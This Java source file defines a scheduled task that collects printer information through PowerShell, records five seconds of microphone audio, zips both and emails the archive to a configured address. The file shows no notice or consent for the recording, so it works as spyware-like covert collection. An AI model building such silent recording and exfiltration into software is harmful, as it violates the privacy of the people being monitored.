package org.example.tasks;

import lombok.extern.slf4j.Slf4j;
import org.example.model.common.EmailCredentials;
import org.example.model.common.Report;
import org.example.model.entity.powershell.PrinterInfo;
import org.example.providers.DockerReportProvider;
import org.example.providers.EventReportProvider;
import org.example.providers.SimplePowerShellReportProvider;
import org.example.providers.WmiObjectsReportProvider;
import org.example.services.AudioService;
import org.example.services.EmailService;
import org.example.utils.PropertiesLoader;
import org.example.utils.ZipUtils;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.stream.Collectors;

import static org.example.common.ObjectsMetadataDictionary.getObjectMetadata;
import static org.example.common.PropertiesNames.*;

@Slf4j
public class CollectAndSendReportToEmailTask extends TimerTask {

    private static final String DATE_FORMAT = "yyyy-MM-dd HH:mm:ss:SSS z";
    private final Properties properties;

    private final EventReportProvider eventReportProvider;
    private final WmiObjectsReportProvider wmiObjectsReportProvider;
    private final SimplePowerShellReportProvider powerShellReportProvider;
    private final DockerReportProvider dockerReportProvider;

    public CollectAndSendReportToEmailTask() {
        this.properties = PropertiesLoader.getProperties();
        this.eventReportProvider = new EventReportProvider();
        this.wmiObjectsReportProvider = new WmiObjectsReportProvider();
        this.powerShellReportProvider = new SimplePowerShellReportProvider();
        this.dockerReportProvider = new DockerReportProvider();
    }

    @Override
    public void run() {

        Report report;
        try {
            report = powerShellReportProvider.getReport(getObjectMetadata(PrinterInfo[].class),
                    "Printer Info",
                    "OS Printer Info"
            );
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        List<File> entireReport = collectReport(report);

        AudioService audioService = new AudioService();
        File audioFile;
        try {
            audioFile = audioService.record(5000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        entireReport.add(audioFile);

        File zipArchive = ZipUtils.createZip(entireReport, "C:\\Users\\dmso0321\\Downloads\\OS User Report.zip");

        log.info("Sending message to email '{}'...", properties.getProperty(EMAIL_RECIPIENT_ADDRESS_PROP));

        EmailService emailService = new EmailService();
        EmailCredentials credentials = EmailCredentials.builder()
                .email(properties.getProperty(EMAIL_SENDER_ADDRESS_PROP))
                .password(properties.getProperty(EMAIL_SENDER_EXTERNAL_PASSWORD_PROP))
                .build();
        String message = String.format("Please do not reply to this message. Report time: %s", getCurrentTime());

        try {
            emailService.sendMessage(properties.getProperty(EMAIL_RECIPIENT_ADDRESS_PROP), credentials,
                    message, zipArchive);
            zipArchive.deleteOnExit();
        } catch (Exception e) {
            log.error("Unable to send message to recipient because of error", e);
        }
    }

    private String getCurrentTime() {
        SimpleDateFormat dateFormatGMT = new SimpleDateFormat(DATE_FORMAT);
        dateFormatGMT.setTimeZone(TimeZone.getTimeZone("GMT+4"));
        return dateFormatGMT.format(new Date());
    }

    private List<File> collectReport(Report... reports) {
        return Arrays.stream(reports).map(Report::getExcelReport).collect(Collectors.toList());
    }
}
